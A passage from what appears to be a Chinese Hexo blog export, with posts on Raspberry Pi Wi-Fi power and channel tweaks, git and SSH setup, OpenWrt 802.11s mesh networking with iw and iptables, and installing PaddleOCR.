                    Bit Rates:1 Mb&#x2F;s; 2 Mb&#x2F;s; 5.5 Mb&#x2F;s; 11 Mb&#x2F;s; 6 Mb&#x2F;s
                              9 Mb&#x2F;s; 12 Mb&#x2F;s; 18 Mb&#x2F;s
                    Bit Rates:24 Mb&#x2F;s; 36 Mb&#x2F;s; 48 Mb&#x2F;s; 54 Mb&#x2F;s
                    Mode:Master
                    Extra:tsf&#x3D;0000000000000000
                    Extra: Last beacon: 17620ms ago
                    IE: Unknown: 0003434832
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 03010B
                    IE: Unknown: 2A0100
                    IE: Unknown: 32043048606C
                    IE: Unknown: 2D1A2C0003FF00000000000000000000000000000000000000000000
                    IE: Unknown: 3D160B001100000000000000000000000000000000000000
                    IE: Unknown: DD180050F2020101000003A4000027A4000042435E0062322F00
                    IE: Unknown: DD05000AEB0100
                    IE: Unknown: DD8E0050F204104A0001101044000102103B0001031047001000000000000010000000FCD7330F3A461021000754502D4C494E4B10230009544C2D57523734324E10240003372E3010420007312E312E312E331054000800060050F204000110110018576972656C657373204E20526F757465722057523734324E100800022288103C0001011049000600372A000120
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>成功修改信道！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>综上所示：</p>
<ol>
<li>可以通过命令行修改功率</li>
</ol>
<p><code>sudo iwconfig wlan1 txpower X</code></p>
<ol>
<li>通过开源项目切换信道<pre class="line-numbers language-none"><code class="language-none">sudo create_ap --s wlan0

sudo create_ap -n wlan0 pi_wifi MyPassWord -c 11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">生成ssh

ssh-keygen -t rsa -C &quot;kp@mmrsl.cn&quot;

ssh-agent -s

ssh-add ~&#x2F;.ssh&#x2F;id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="扩展：功率修改测试及方案"><a href="#扩展：功率修改测试及方案" class="headerlink" title="扩展：功率修改测试及方案"></a>扩展：功率修改测试及方案</h2><ol>
<li>开启热点 <pre class="line-numbers language-none"><code class="language-none">sudo create_ap --s wlan0

sudo create_ap -n wlan0 pi_wifi MyPassWord -c 11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
<li>修改功率</li>
</ol>
<p><code>sudo iwconfig wlan1 txpower 30</code></p>
<ol>
<li>检测功率</li>
</ol>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Merry Christmas</title>
    <url>/2020/12/24/merry_christmas/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Merry-Christmas"><a href="#Merry-Christmas" class="headerlink" title="Merry Christmas"></a><center>Merry Christmas</center></h1><center>
<div style="position:relative; padding-bottom:75%; width:100%; height:0">
    <iframe src="//player.bilibili.com/player.html?aid=45996894&bvid=BV1xb411e7ru&cid=80590947&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"style="position:absolute; height: 100%; width: 100%;"> </iframe>
</div>
</center>

<span id="more"></span>
<ol>
<li>git push 方法</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">git init
git add .
git commit -m &quot;first commit&quot;
git remote add origin URL
git push -u origin master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>本过程可以参考我为大家寻找的教程<a href="https://www.codekp.cn/2020/12/12/%E8%A1%A8%E7%99%BD%E7%BD%91%E7%AB%99%E3%80%81%E7%BD%97%E7%9B%98%E6%97%B6%E9%92%9F%E6%95%99%E7%A8%8B/">如何优雅的制作表白网站和罗盘时钟</a></p>
<ol>
<li>圣诞网站模板分享</li>
</ol>
<ul>
<li><a href="https://www.codekp.cn/Chrismas/index.html">demo</a></li>
<li><a href="https://github.com/mmrslwan1110/Chrismas">源码</a></li>
</ul>
<ol>
<li>电影分享 </li>
</ol>
<ul>
<li><a href="https://www.bilibili.com/bangumi/play/ep258944?theme=movie%3Ffrom%3Dsearch&amp;seid=16305206199116632162">love actually</a></li>
</ul>
<center>


<h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋!"></a><a href="https://christmasexperiments.com/">彩蛋!</a></h2><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><h6 id="一个假装不存在的彩蛋"><a href="#一个假装不存在的彩蛋" class="headerlink" title="一个假装不存在的彩蛋"></a><a href="https://interview.ueno.co/">一个假装不存在的彩蛋</a></h6>]]></content>
      <categories>
        <category>电影推荐</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>network map</title>
    <url>/2021/04/14/nmap/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="a8ea0b0613c97be02731221932415fecef9d6fc4ac82870e6703d456afa25b54"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>network map</category>
      </categories>
      <tags>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>openwrt_树莓派_mesh自组织网络</title>
    <url>/2021/11/06/openwrt-%E6%A0%91%E8%8E%93%E6%B4%BE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="openwrt-树莓派-mesh自组织网络"><a href="#openwrt-树莓派-mesh自组织网络" class="headerlink" title="openwrt_树莓派_mesh自组织网络"></a>openwrt_树莓派_mesh自组织网络</h1><h2 id="openwrt"><a href="#openwrt" class="headerlink" title="openwrt"></a>openwrt</h2><ul>
<li>需求：主要是为了进行无缝漫游，可以控制的路由器，同时尝试mesh自组织网络，并进行测试。</li>
<li>oepnwrt基于Linux系统，可以在做路由器的同时当作一个服务器来使用，扩展性非常强。</li>
</ul>
<p>OpenWrt官方介绍：</p>
<blockquote>
<p>OpenWrt项目是针对嵌入式设备的Linux操作系统。OpenWrt不是一个单一且不可更改的固件，而是提供了一个完全可写的文件系统及软件包管理。这使您可以不使用供应商提供的应用程序选择和配置，而是通过使用软件包来定制设备以适应任何应用程序。对于开发人员来说，OpenWrt是一个构建应用程序的框架，无需在其周围构建完整的固件; 对于普通用户来说，这意味着拥有了完全定制的能力，能以意想不到的方式使用该设备。<br>OpenWrt/LEDE是一个为嵌入式设备（通常是无线路由器）开发的高扩展度的GNU/Linux发行版。与许多其他路由器的发行版不同，OpenWrt/LEDE是一个完全为嵌入式设备构建的功能全面、易于修改的由现代Linux内核驱动的操作系统。在实践中，这意味着您可以得到您需要的所有功能，却仍能避免臃肿。</p>
</blockquote>
<h2 id="安装openwrt"><a href="#安装openwrt" class="headerlink" title="安装openwrt"></a>安装openwrt</h2><p>  openwrt的设备支持列表如<a href="https://openwrt.org/toh/start">OpenWrt 支持的设备列表</a>所示,各版本的树莓派都可以安装最新版本的OpenWrt，截止到2021年2月1日<br>  <img src="https://www.codekp.cn/download/img/ubuntu/openwrt.png" alt=""></p>
<ul>
<li>OpenWrt 支持的树莓派版本</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>设备表</th>
<th>型号</th>
<th>更新日期</th>
<th>版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>Raspberry Pi 2B 1.0/1.1</td>
<td>21.02.1</td>
<td>raspberry_pi</td>
<td><a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_2_b">View/Edit data</a></td>
</tr>
<tr>
<td>Raspberry Pi 2    B 1.2</td>
<td>21.02.1</td>
<td>raspberry_pi</td>
<td><a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_2_b_bcm2837">View/Edit data</a></td>
</tr>
<tr>
<td>Raspberry Pi 3    B</td>
<td>21.02.1</td>
<td>raspberry_pi</td>
<td><a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_3_b">View/Edit data</a></td>
</tr>
<tr>
<td>Raspberry Pi 3    B+</td>
<td>21.02.1</td>
<td>raspberry_pi</td>
<td><a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_3_bplus">View/Edit data</a></td>
</tr>
<tr>
<td>Raspberry Pi    A</td>
<td>21.02.1</td>
<td>raspberry_pi</td>
<td><a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_a">View/Edit data</a></td>
</tr>
<tr>
<td>Raspberry Pi    B</td>
<td>21.02.1</td>
<td>raspberry_pi</td>
<td><a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_b">View/Edit data</a></td>
</tr>
<tr>
<td>Raspberry Pi    B+</td>
<td>21.02.1</td>
<td>raspberry_pi</td>
<td><a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_bplus">View/Edit data</a></td>
</tr>
<tr>
<td>Raspberry Pi 4    B</td>
<td>21.02.1</td>
<td>raspberry_pi</td>
<td><a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_foundation_raspberry_pi_4_b">View/Edit data</a></td>
</tr>
<tr>
<td>Raspberry Pi 4    400</td>
<td>21.02.1</td>
<td>raspberry_pi</td>
<td><a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_foundation_raspberry_pi_400">View/Edit data</a></td>
</tr>
<tr>
<td>Raspberry Pi 3    Compute Module 3</td>
<td>21.02.1</td>
<td>raspberry_pi</td>
<td><a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_foundation_raspberry_pi_cm3">View/Edit data</a></td>
</tr>
<tr>
<td>Raspberry Pi 4    Compute Module 4</td>
<td>21.02.1</td>
<td>raspberry_pi</td>
<td><a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_foundation_raspberry_pi_cm4">View/Edit data</a></td>
</tr>
<tr>
<td>Raspberry Pi    Zero</td>
<td>21.02.1</td>
<td>raspberry_pi</td>
<td><a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_zero">View/Edit data</a></td>
</tr>
<tr>
<td>Raspberry Pi    Zero W</td>
<td>21.02.1</td>
<td>raspberry_pi</td>
<td><a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_zero_w">View/Edit data</a></td>
</tr>
</tbody>
</table>
</div>
<p>下载 OpenWrt 镜像<br>在设备上面的表格中选择自己的树莓派型号，点击 View/Edit data ，然后进入 详情页面，选择“ Firmware OpenWrt Install URL ”，这个就是要下载的镜像，我们把它保存到本地。</p>
<p>树莓派4B下载地址：<a href="https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_foundation_raspberry_pi_4_b">https://openwrt.org/toh/hwdata/raspberry_pi_foundation/raspberry_pi_foundation_raspberry_pi_4_b</a></p>
<p>  <img src="https://www.codekp.cn/download/img/ubuntu/pi_install.png" alt=""></p>
<p>  因此下载地址为：<a href="http://downloads.openwrt.org/releases/21.02.1/targets/bcm27xx/bcm2711/openwrt-21.02.1-bcm27xx-bcm2711-rpi-4-squashfs-factory.img.gz">http://downloads.openwrt.org/releases/21.02.1/targets/bcm27xx/bcm2711/openwrt-21.02.1-bcm27xx-bcm2711-rpi-4-squashfs-factory.img.gz</a></p>
<p>将 OpenWrt 镜像烧录到树莓派中，windows下可以使用 Etcher 软件烧录。同样OpenWrt 镜像支持树莓派从U盘启动：<br>但我尝试，此过程无法成功脸上wifi。</p>
<h3 id="Openwrt固件"><a href="#Openwrt固件" class="headerlink" title="Openwrt固件"></a>Openwrt固件</h3><p>换个地址下载<a href="https://openwrt.cc/releases/targets/bcm27xx/bcm2711/">openwrt.cc</a></p>
<h2 id="树莓派上的-OpenWrt-配置"><a href="#树莓派上的-OpenWrt-配置" class="headerlink" title="树莓派上的 OpenWrt 配置"></a>树莓派上的 OpenWrt 配置</h2><p>以下是我的树莓派无线路由器配置过程。</p>
<ol>
<li>登陆 OpenWrt<br>用网线将树莓派和电脑相连接，然后在浏览器中输入192.168.1.1，即可打开登陆页面。<blockquote>
<p>选择openwrt-bcm27xx-bcm2711-rpi-4-ext4-factory.img 并下载</p>
</blockquote>
</li>
<li>烧录镜像</li>
</ol>
<p>在电脑上用balenaEtcher（或其他可烧录镜像的软件）读取sd卡，烧录进刚刚下好的完整镜像</p>
<ol>
<li>进入配置界面</li>
</ol>
<p>将SD卡塞进树莓派，连接电源（注意：这时候树莓派不要连接网线到路由器）</p>
<p>电脑或者手机通过wifi连接openwrt，浏览器输入192.168.1.1进入openwrt的管理界面</p>
<p>默认用户root 密码password</p>
<p>OpenWrt 登陆页面<br>自己设置一个密码，点击login登陆</p>
<h2 id="mesh自组织网络"><a href="#mesh自组织网络" class="headerlink" title="mesh自组织网络"></a>mesh自组织网络</h2><p>如下图所示，mesh网络由MPP、MP、MAP三种设备组成：</p>
<ul>
<li>MPP(mesh portal point)：连接无线mesh网络和其他类型的网络，并与mesh网络内部MP/MAP节点进行通信。这个节点具有Portal功能，通过这个节点，mesh内部的节点可以和外部网络通信。</li>
<li>MP(mesh point)：在mesh网络中，使用IEEE 802.11sMAC和PHY协议进行无线通信，并且支持mesh功能的节点。该节点支持自动拓扑、路由的自动发现、数据包的转发等功能。</li>
<li>MAP(mesh access point)：任何支持AP功能的mesh point，可以为Station提供接入功能。</li>
</ul>
<p>这三种设备配置也不一样，他们之间是通过mesh链路连接在一起的，但是需要保证mesh节点工作的信道号和mesh id号必须相同！<br>  <img src="https://www.codekp.cn/download/img/ubuntu/mesh_model.png" alt=""></p>
<h3 id="设置开放性环状网络"><a href="#设置开放性环状网络" class="headerlink" title="设置开放性环状网络"></a>设置开放性环状网络</h3><p>在此示例中，我们将配置一个mesh节点以使用mesh网络，该节点将自动与使用相同配置（mesh和信道）的任何其他对等节点连接。<br>每个mesh节点都需要如下设置：</p>
<ol>
<li>使用编译iw的内核并正确安装引导多个节点。</li>
<li>选择一个mesh id。mesh id是一个将在mesh节点信标中使用的字符串。只有具有相同mesh id的网格点才能相互通信。mesh id的最大长度为32个字节。在本文档中，我们将网格ID称为$MESH_ID。</li>
<li>在每个节点上为wlanN设备添加一个新的Mesh接口。您可以选择网格接口的名称。“mesh”是一种流行的选择。在本文中，我们将mesh 接口称为$MESH_IFACE,我起名为mesh0。</li>
</ol>
<blockquote>
<p>使用第二张网卡wlan1来做mesh组网，过程如下：</p>
</blockquote>
<ol>
<li>关闭wlan1</li>
</ol>
<p><code>ip link set wlan1 down</code></p>
<ol>
<li>添加mesh</li>
</ol>
<p><code>iw dev wlan1 interface add mesh0 type mp</code></p>
<ol>
<li>查看是否创建成功 </li>
</ol>
<p><code>ifconfig -a | grep mesh0</code></p>
<blockquote>
<p>输出 mesh0     Link encap:Ethernet  HWaddr E8:4E:06:96:A6:51</p>
</blockquote>
<ol>
<li>注意：默认情况下，所有mesh接口都从信道1开始。</li>
</ol>
<p><code>iw dev mesh0 set channel 1</code></p>
<ol>
<li>关闭mesh0并设置mesh id</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">ip link set mesh0 down
iw dev mesh0 set meshid mymesh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ol>
<li>启动mesh0</li>
</ol>
<p><code>ifconfig mesh0 up</code></p>
<ol>
<li>分配ip，mesh组网要在同一个网段下</li>
</ol>
<p><code>ifconfig mesh0 192.168.1.171</code></p>
<blockquote>
<p>这样一台设备就配置好了。配置其他设备的时候只需要分陪不同的IP即可。在默认配置中，mesh节点将自动尝试创建所有其他具有相同mesh id的网格节点的对等链接。</p>
<p>或者使用另一种方式：</p>
<ol>
<li>使用phy接口，使用iw list，查看网卡对应的phy，我的wlan1对应的phy1,先关掉wlan1</li>
</ol>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">ip link set wlan1 down
iw phy phy1 interface add mesh0 type mp mesh_id mymesh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ol>
<li>验证是否创建成功</li>
</ol>
<p><code>ifconfig -a | grep mesh0</code></p>
<ol>
<li>启用mesh0</li>
</ol>
<p><code>ifconfig mesh0 up</code></p>
<ol>
<li>设置ip，假设为192.168.1.171</li>
</ol>
<p><code>ifconfig mesh0 192.168.1.171</code></p>
<p>方法三：</p>
<p>树莓派启动后，默认有有线网卡 eth0、无线网卡wlan0；为了支持 Mesh，还需加载 USB 的无线 wlan 驱动，驱动加载完成后，系统会显示 wlan1接口。</p>
<ol>
<li>先通过 Openwrt 设置 wlan0 为 ap 模式，为移动终端等提供无线 WiFi接入；</li>
<li>再设置 wlan1 网卡为 Mesh 模式，同时所有不同的树莓派 wlan1网卡的 Mesh 信道都必须设置一致，由于无线信道带宽重叠原因，一般信道 1，6，11 为互不干扰信道，在此将 Mesh网络信道设置为 1信道；</li>
<li>接着设置 wlan1 网卡的 MAC 地址及 IP 地址，由于在 Mesh 网络中，识别不同设备是通过 MAC 来识别的，因此必须设置不同的 MAC 地址；同时设置 IP 地址为同一掩码范围内的 IP地址，如 192.168.2.0/24；</li>
<li>连接测试 Mesh 网络状态，各终端使用 ping 命令测试网络通断、丢包率等；</li>
<li>为了使无线骨干网与移动网络等网系联通，这只 桥 接 网 卡 用 于 连 接 eth0，wlan0，wlan1，同 时 配 置iptables 出入站规则；将 MPP 网关节点的 eth0 网卡接口通过有线连接至 4G 无线网关 CPE 上；为 eth0 配置 4G 固定 IP地址，测试 MPP，MP等节点与 4G 网络通畅状态。</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">iw dev wlan1 del
iw phy phy1 interface add Mesh0 type Mesh
iw dev Mesh0 set Meshid myMesh
iw dev Mesh0 set channel 1
ifconfig Mesh0 hw ether 00：1C：11：11：11：11
ifconfig Mesh0 up
ifconfig Mesh0 192.168.2.1
配置 iptables出入站规则
iptables -F
iptables -X
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o Mesh0 -j ACCEPT
iptables -A FORWARD -i Mesh0 -o eth0 -j ACCEPT
iptables -L -n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>验证使用iw dev mesh0 station dump和iw dev mesh0 mpath dump命令检查已建立的对等链接：<br><pre class="line-numbers language-none"><code class="language-none">
Station e8:4e:06:96:a2:44 (on mesh0)
        inactive time:  950 ms
        rx bytes:       3530
        rx packets:     89
        tx bytes:       170
        tx packets:     3
        tx retries:     0
        tx failed:      0
        rx drop misc:   9
        signal:         -30 dBm
        signal avg:     -30 dBm
        Toffset:        1395514681956 us
        tx bitrate:     54.0 MBit&#x2F;s
        tx duration:    0 us
        rx bitrate:     54.0 MBit&#x2F;s
        rx duration:    0 us
        mesh llid:      39650
        mesh plid:      29147
        mesh plink:     ESTAB
        mesh airtime link metric: 1906
        mesh connected to gate: no
        mesh connected to auth server:  no
        mesh local PS mode:     ACTIVE
        mesh peer PS mode:      ACTIVE
        mesh non-peer PS mode:  ACTIVE
        authorized:     yes
        authenticated:  yes
        associated:     yes
        preamble:       long
        WMM&#x2F;WME:        yes
        MFP:            no
        TDLS peer:      no
        DTIM period:    2
        beacon interval:1000
        short slot time:yes
        connected time: 61 seconds
        associated at [boottime]:       274.466s
        associated at:  1636042217164 ms
        current time:   1636042278531 ms
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-none"><code class="language-none">
DEST ADDR         NEXT HOP          IFACE       SN      METRIC  QLEN    EXPTIMEDTIM     DRET    FLAGS   HOP_COUNT       PATH_CHANGE
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>一些解释：<br>Destination MAC Address：目地mac地址。此mesh路径的目的地。直接路径的目的地和下一跳具有相同的MAC地址。<br>Next-hop MAC address：下一跳地址。直接路径的目的地和下一跳具有相同的MAC地址。<br>IFACE ：专属网的名称<br>SN：此路径的目标序列号。 DSN用于确定节点路径信息的“新鲜度”。例如，假设节点接收到其路径表中已经存在的目的地的路径响应。如果路径响应的DSN较高，则它将替换现有路径，因为它将被认为是较新的。<br>Air Time Link Metric：路径的度量（或“成本”）。较低的度量标准是首选，并且在选择了多个路径的情况下，协议栈将选择成本最低的协议（即：空中链路度量最低的协议）。该值是使用预期的吞吐量得出的（metric = 1 + 8192 / Expected_throughput_mbps）预期吞吐量（Expected_throughput_mbps）取决于驱动程序（例如，某些包含重传）。<br>Frame Queue Length：此网格路径的排队帧数。<br>Expiration Time：此mesh路径过期的时间（以jiffies为单位）<br>Discovery Timeout：路径发现的剩余时间（如果正在发现此路径）。<br>Discovery Retries：重试发现的次数（如果正在发现此路径）。<br>Flags：它是一个位掩码，由该路径的以下状态标志组成：</p>
<p>MESH_PATH_ACTIVE = BIT(0),<br>MESH_PATH_RESOLVING = BIT(1),<br>MESH_PATH_DSN_VALID = BIT(2),<br>MESH_PATH_FIXED = BIT(3),<br>MESH_PATH_RESOLVED = BIT(4),</p>
<h2 id="无线网桥"><a href="#无线网桥" class="headerlink" title="无线网桥"></a>无线网桥</h2><blockquote>
<p>即一个路由器做中心路由器，开启dhcp，其他的路由器，自动分配ip地址，关闭dhcp，连接上其他路由器即可。其若非中心路由器脱离网络，其他路由器依旧可以维持通信正常。</p>
<h3 id="管理界面的设置"><a href="#管理界面的设置" class="headerlink" title="管理界面的设置"></a>管理界面的设置</h3><p>注意事项：<br>mesh自组织网络，相较于无线网桥，其所有路由器均开启dhcp，若断开任意一个路由器，均可维持通信正常。</p>
</blockquote>
<p>以下是管理界面配置mesh自组织网络，拥有长距离通信，扩充室内通信距离，其鲁棒性更高。</p>
<blockquote>
<p>需要注意的是mesh共用同一个信道且ip需要相同。</p>
</blockquote>
<p>其每个路由器的lan口需要不同，且开启dhcp，其中一个网卡开ap，一个mesh。</p>
<p>  <img src="https://www.codekp.cn/download/img/ubuntu/meshopenwrt.png" alt=""></p>
<p>  <img src="https://www.codekp.cn/download/img/ubuntu/meshopenwrt1.png" alt=""></p>
<p>  <img src="https://www.codekp.cn/download/img/ubuntu/meshopenwrt2.png" alt=""></p>
<p>参考：</p>
<ul>
<li><a href="https://www.jianshu.com/p/4f67a4bcb541">简书</a></li>
<li>[1]李贤烈,郭超平,王盛青,靳俊程.基于树莓派的无线Mesh网络组织与实现[J].现代电子技术,2018,41(23):87-92+97.</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pyqt5</tag>
      </tags>
  </entry>
  <entry>
    <title>PaddleOCR光学字符识别</title>
    <url>/2021/10/25/paddleocr/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PaddleOCR光学字符识别"><a href="#PaddleOCR光学字符识别" class="headerlink" title="PaddleOCR光学字符识别"></a>PaddleOCR光学字符识别</h1><pre><code>OCR光学字符识别，将不同类型的文档，图像中的字符保存为可编辑和可搜索的数据。
</code></pre><h2 id="PaddleOCR"><a href="#PaddleOCR" class="headerlink" title="PaddleOCR"></a>PaddleOCR</h2><p>PaddleOCR旨在打造一套丰富、领先、且实用的OCR工具库，助力使用者训练出更好的模型，并应用落地。</p>
<ul>
<li>PPOCR系列高质量预训练模型，准确的识别效果<ul>
<li>超轻量ppocr_mobile移动端系列：检测（3.0M）+方向分类器（1.4M）+ 识别（5.0M）= 9.4M</li>
<li>通用ppocr_server系列：检测（47.1M）+方向分类器（1.4M）+ 识别（94.9M）= 143.4M</li>
<li>支持中英文数字组合识别、竖排文本识别、长文本识别</li>
<li>支持80+多语言识别，详见多语言模型</li>
</ul>
</li>
<li>丰富易用的OCR相关工具组件<ul>
<li>半自动数据标注工具PPOCRLabel：支持快速高效的数据标注</li>
<li>数据合成工具Style-Text：批量合成大量与目标场景类似的图像</li>
</ul>
</li>
<li>支持用户自定义训练，提供丰富的预测推理部署方案</li>
<li>支持PIP快速安装使用</li>
<li><p>可运行于Linux、Windows、MacOS等多种系统</p>
</li>
<li><p>预安装 pytorch，安装过程<a href="https://www.codekp.cn/2021/10/22/ubuntu-NVIDIA30xx%E6%98%BE%E5%8D%A1%E5%AE%89%E8%A3%85/">参考ubuntu_NVIDIA30xx，开发环境显卡安装</a></p>
</li>
</ul>
<h2 id="安装paddleocr"><a href="#安装paddleocr" class="headerlink" title="安装paddleocr"></a>安装paddleocr</h2><p>在经历上述过程后，很容易安装paddleocr，运行以下命令：</p>
<p><code>pip install paddleocr</code></p>
<p><code>python -m pip install paddlepaddle-gpu==2.1.3.post112 -f https://www.paddlepaddle.org.cn/whl/windows/mkl/avx/stable.html</code></p>
<p>安装报错无法解决</p>
<p>安装gpu版本</p>
<ul>
<li><code>pip install paddlepaddle-gpu -i https://mirror.baidu.com/pypi/simple</code></li>
</ul>
<p>安装cpu版本</p>
<ul>
<li><code>pip install paddlepaddle -i https://mirror.baidu.com/pypi/simple</code></li>
</ul>
<p>输出结果<br><pre class="line-numbers language-none"><code class="language-none">Looking in indexes: https:&#x2F;&#x2F;mirror.baidu.com&#x2F;pypi&#x2F;simple
Collecting paddlepaddle-gpu
  Downloading https:&#x2F;&#x2F;mirror.baidu.com&#x2F;pypi&#x2F;packages&#x2F;ad&#x2F;3f&#x2F;074aa18eb969f452ebd712809756702fa7ad04aeea25960b77ed19c83870&#x2F;paddlepaddle_gpu-2.1.3-cp38-cp38-win_amd64.whl (462.5 MB)
     |████████████████████████████████| 462.5 MB 1.9 kB&#x2F;s
  Downloading https:&#x2F;&#x2F;mirror.baidu.com&#x2F;pypi&#x2F;packages&#x2F;a4&#x2F;23&#x2F;13d2991c156cfd22bfd4a9ae6dcb1a9372004a0e16508b680d17f3280eb4&#x2F;numpy-1.19.3-cp38-cp38-win_amd64.whl (13.3 MB)
     |████████████████████████████████| 13.3 MB 57 kB&#x2F;s
Requirement already satisfied: certifi&gt;&#x3D;2017.4.17 in d:\users\vadmin\anaconda3\lib\site-packages (from requests&gt;&#x3D;2.20.0-&gt;paddlepaddle-gpu) (2020.12.5)
Requirement already satisfied: urllib3&lt;1.27,&gt;&#x3D;1.21.1 in d:\users\vadmin\anaconda3\lib\site-packages (from requests&gt;&#x3D;2.20.0-&gt;paddlepaddle-gpu) (1.26.4)
Requirement already satisfied: chardet&lt;5,&gt;&#x3D;3.0.2 in d:\users\vadmin\anaconda3\lib\site-packages (from requests&gt;&#x3D;2.20.0-&gt;paddlepaddle-gpu) (4.0.0)
Requirement already satisfied: idna&lt;3,&gt;&#x3D;2.5 in d:\users\vadmin\anaconda3\lib\site-packages (from requests&gt;&#x3D;2.20.0-&gt;paddlepaddle-gpu) (2.10)
Installing collected packages: numpy, gast, astor, paddlepaddle-gpu
  Attempting uninstall: numpy
    Found existing installation: numpy 1.20.1
    Uninstalling numpy-1.20.1:
      Successfully uninstalled numpy-1.20.1
Successfully installed astor-0.8.1 gast-0.3.3 numpy-1.19.3 paddlepaddle-gpu-2.1.3
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p><code>https://www.lfd.uci.edu/~gohlke/pythonlibs/#shapely</code><br>安装对应3.8的levenshtein、shapely</p>
<h2 id="使用paddleocr"><a href="#使用paddleocr" class="headerlink" title="使用paddleocr"></a>使用paddleocr</h2><p><img src="https://www.codekp.cn/download/img/ubuntu/NVIDIA1.png" alt=""></p>
<ul>
<li>URL图片<br><code>Image=&#39;https://www.codekp.cn/download/img/ubuntu/NVIDIA1.png&#39;</code></li>
<li>本地图片<br><code>Image=&#39;labelimg.jpg&#39;</code></li>
</ul>
<p><code>result = ocr.ocr(img_path)</code></p>
<p>结果<br><img src="https://www.codekp.cn/download/img/ubuntu/NVIDIA5.png" alt=""></p>
<p><img src="https://www.codekp.cn/download/img/ubuntu/NVIDIA6.png" alt=""></p>
<h2 id="参考代码"><a href="#参考代码" class="headerlink" title="参考代码"></a>参考代码</h2><pre class="line-numbers language-none"><code class="language-none">from paddleocr import PaddleOCR, draw_ocr
from PIL import Image
# Paddleocr supports Chinese, English, French, German, Korean and Japanese.
